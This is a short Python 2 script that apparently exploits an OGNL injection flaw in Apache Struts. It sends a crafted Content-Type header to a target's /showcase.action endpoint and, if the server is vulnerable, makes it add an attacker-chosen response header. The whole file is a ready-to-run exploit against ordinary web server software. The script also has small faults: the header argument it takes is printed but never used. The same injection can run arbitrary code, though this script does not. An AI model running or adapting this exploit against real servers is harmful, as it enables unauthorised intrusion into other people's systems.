#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import urllib2
import httplib

def exploit(host,injected_header):
    ognl_payload = ".multipart/form-data~${"
    #idk
    ognl_payload += '#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL",1330+7)'
    ognl_payload += "}"
    if not ":" in host:
        host = "{}:8080".format(host)

    url = "http://{}/showcase.action".format(host)
    print "\nInjecting Header: "+ injected_header + " 1337"

    headers = {'Content-Type': ognl_payload}
    request = urllib2.Request(url, headers=headers)
    response = urllib2.urlopen(request)
    print "\n\n", response.headers

if len(sys.argv) < 2:
    sys.exit('Usage: %s <host:port> <header>' % sys.argv[0])
else:
    exploit(sys.argv[1],sys.argv[2])
